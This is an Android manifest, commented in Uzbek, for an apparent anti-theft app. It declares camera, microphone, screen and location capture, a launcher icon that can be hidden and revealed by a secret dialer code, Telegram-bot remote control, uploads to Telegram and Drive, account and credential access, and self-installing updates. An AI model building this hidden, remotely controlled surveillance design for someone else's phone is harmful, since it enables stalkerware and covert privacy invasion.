<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <!-- Kamera -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-feature android:name="android.hardware.camera" android:required="false" />
    <uses-feature android:name="android.hardware.camera.front" android:required="false" />

    <!-- Lokatsiya (o'g'irlangan qurilmani topish uchun) -->
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />

    <!-- SIM almashtirilganini aniqlash uchun -->
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />

    <!-- Tarmoq -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

    <!-- Galereyaga saqlash (API 28 va pastda kerak; API 29+ da scoped storage) -->
    <uses-permission
        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
        android:maxSdkVersion="28" />

    <!-- Foreground service (internet kutish xizmati uchun ham) -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <!-- API 34+ uchun kamera foreground service -->
    <uses-permission
        android:name="android.permission.FOREGROUND_SERVICE_CAMERA"
        android:minSdkVersion="34" />
    <!-- API 34+ uchun navbatni internet qaytganda yuborish xizmati -->
    <uses-permission
        android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"
        android:minSdkVersion="34" />
    <!-- API 34+ uchun ekran yozish foreground service -->
    <uses-permission
        android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"
        android:minSdkVersion="34" />
    <!-- Auto-update: yangi APK o'rnatish uchun -->
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
    <!-- Zaxira nusxa: qurilmadagi akkauntlar ro'yxatini olish uchun -->
    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
    <!-- Drive token olish uchun -->
    <uses-permission android:name="android.permission.USE_CREDENTIALS" />
    <!-- Media fayllarga kirish (Android 12 va undan past) -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
        android:maxSdkVersion="32" />
    <!-- Media fayllarga kirish (Android 13+) -->
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"
        android:minSdkVersion="33" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"
        android:minSdkVersion="33" />
    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"
        android:minSdkVersion="33" />

    <!-- Bildirishnomalar (API 33+) -->
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />

    <!-- Ovozli signal uchun tebranish -->
    <uses-permission android:name="android.permission.VIBRATE" />

    <!-- Mikrofon (audio yozish uchun) -->
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <!-- API 34+ uchun mikrofon foreground service -->
    <uses-permission
        android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"
        android:minSdkVersion="34" />

    <!-- Background joylashuv (Android 10+, LocationTrackingService uchun) -->
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
    <!-- API 34+ uchun location foreground service -->
    <uses-permission
        android:name="android.permission.FOREGROUND_SERVICE_LOCATION"
        android:minSdkVersion="34" />

    <!-- MIUI/Xiaomi battery optimization whitelist so'rash uchun -->
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />

    <!-- Device Admin -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

    <application
        android:allowBackup="false"
        android:label="@string/app_name"
        android:theme="@style/Theme.AppCompat.Light.DarkActionBar">

        <!-- Asosiy ekran -->
        <activity
            android:name=".MainActivity"
            android:exported="true" />

        <!-- Launcher belgisi (ikonka) — shu alias yashirin/ko'rinadigan qilinadi, MainActivity emas -->
        <activity-alias
            android:name=".MainActivityAlias"
            android:targetActivity=".MainActivity"
            android:enabled="true"
            android:exported="true"
            android:label="@string/app_name">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <!-- Sozlamalar ekrani -->
        <activity
            android:name=".SettingsActivity"
            android:exported="false"
            android:label="@string/title_settings" />

        <!-- Device Admin Receiver: parol xatolarini kuzatadi -->
        <receiver
            android:name=".AdminReceiver"
            android:permission="android.permission.BIND_DEVICE_ADMIN"
            android:exported="true">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

        <!-- Kamera xizmati -->
        <service
            android:name=".CameraService"
            android:foregroundServiceType="camera"
            android:exported="false" />

        <!-- Internet yo'q bo'lganda navbatga qo'yilgan suratlarni kuzatib, qaytganda yuboradi -->
        <service
            android:name=".PendingSendService"
            android:foregroundServiceType="dataSync"
            android:exported="false" />

        <!-- Qurilma qayta ishga tushganda navbatni tekshirib chiqadi -->
        <receiver
            android:name=".BootReceiver"
            android:exported="false">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

        <!-- Ikonka yashirin bo'lsa, *#*#8228#*#* terilganda ilova qayta ko'rinadigan bo'ladi -->
        <receiver
            android:name=".SecretCodeReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.provider.Telephony.SECRET_CODE" />
                <data android:scheme="android_secret_code" android:host="8228" />
            </intent-filter>
        </receiver>

        <!-- Qisqa video yozib olish xizmati -->
        <service
            android:name=".VideoCaptureService"
            android:foregroundServiceType="camera"
            android:exported="false" />

        <!-- Ovozli signal (topish uchun) -->
        <service
            android:name=".AlarmService"
            android:exported="false" />

        <!-- Ekran yozuvi: MediaProjection orqali, Telegram'ga yuboradi -->
        <service
            android:name=".ScreenRecordService"
            android:foregroundServiceType="mediaProjection|camera"
            android:exported="false" />

        <!-- Ekran yozuvlarini ko'rish ekrani -->
        <activity
            android:name=".RecordingsActivity"
            android:exported="false" />

        <!-- Google akkauntlarni ulash ekrani -->
        <activity
            android:name=".AccountLinkActivity"
            android:exported="false" />

        <!-- Media backup xizmati (Drive + Telegram) -->
        <service
            android:name=".BackupJob"
            android:foregroundServiceType="dataSync"
            android:exported="false" />

        <!-- Shaffof Activity — tizimning MediaProjection ruxsat dialogini ochadi -->
        <activity
            android:name=".ScreenRecordPermissionActivity"
            android:exported="false"
            android:theme="@style/Theme.Transparent"
            android:taskAffinity=""
            android:excludeFromRecents="true" />

        <!-- Auto-update: APK fayllarini tizimga berish uchun FileProvider -->
        <provider
            android:name="androidx.core.content.FileProvider"
            android:authorities="${applicationId}.provider"
            android:exported="false"
            android:grantUriPermissions="true">
            <meta-data
                android:name="android.support.FILE_PROVIDER_PATHS"
                android:resource="@xml/file_paths" />
        </provider>

        <!-- Telegram bot buyruqlarini kuzatish (uzoqdan boshqarish) -->
        <service
            android:name=".BotCommandListener"
            android:foregroundServiceType="dataSync"
            android:exported="false" />

        <!-- Yon tugma orqali audio yozib olish xizmati -->
        <service
            android:name=".AudioRecordService"
            android:foregroundServiceType="microphone"
            android:exported="false" />

        <!-- Joylashuvni doim kuzatib boruvchi xizmat (trigger bo'lganda tez javob berish uchun) -->
        <service
            android:name=".LocationTrackingService"
            android:foregroundServiceType="location"
            android:exported="false" />

        <!--
            Yon tugma shortcut'lari:
              3x Volume Up   → audio yozish
              3x Volume Down → video yozish
              2x Down + hold → panik signal (ovoz + video + joylashuv)
            Foydalanuvchi Sozlamalar → Maxsus imkoniyatlar dan qo'lda yoqishi shart.
        -->
        <service
            android:name=".VolumeKeyAccessibilityService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service" />
        </service>

    </application>

</manifest>
